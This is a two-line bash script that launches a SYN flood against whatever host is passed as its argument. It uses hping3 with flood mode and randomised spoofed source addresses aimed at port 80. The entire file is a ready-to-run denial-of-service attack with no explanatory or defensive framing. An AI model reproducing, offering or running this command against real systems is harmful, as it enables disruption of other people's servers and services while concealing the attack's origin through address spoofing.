#!/bin/bash
hping3 -S --flood --rand-source "$1" -p 80
